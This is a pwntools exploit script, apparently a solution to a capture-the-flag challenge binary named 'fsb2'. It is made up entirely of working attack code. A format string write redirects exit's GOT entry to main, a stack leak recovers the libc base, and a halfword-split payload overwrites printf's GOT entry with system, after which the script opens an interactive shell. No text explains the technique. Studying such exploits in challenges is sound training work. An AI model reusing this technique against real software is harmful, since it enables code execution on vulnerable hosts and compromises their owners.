from pwn import *

p = process("./fsb2")
e = ELF("./fsb2")
libc = e.libc

p.sendline(fmtstr_payload(6, {e.got['exit']: e.sym['main']}))

p.sendline("%137$p")
p.recvuntil("0x")


libc_start_main = int(p.recvline()[:-1], 16) - 240
libc_base = libc_start_main - libc.sym['__libc_start_main']
system = libc_base + libc.sym['system']
log.info("main: " + hex(libc_start_main))
log.info("libc base: " + hex(libc_base))
log.info("system: " + hex(system))
log.info("printf@got: " + hex(e.got['printf']))


system1 = (system & 0xffff0000) >> 16
system2 = system & 0xffff

pay = "%" + str(system2) + "c"
pay += "%{0}$hn"
if system1 - system2 < 0:
    pay += "%" + str(system1 - system2 + 0x10000) + "c"
else:
    pay += "%" + str(system1 - system2) + "c"
pay += "%{1}$hn"
pay += "A" * (16 - len(pay) % 8)
pay = pay.format(len(pay) / 8 + 5, len(pay) / 8 + 6)
pay = pay[:len(pay) - len(pay) % 8]

pay += p64(e.got['printf']) + p64(e.got['printf'] + 2)

p.sendline(pay)
p.interactive()

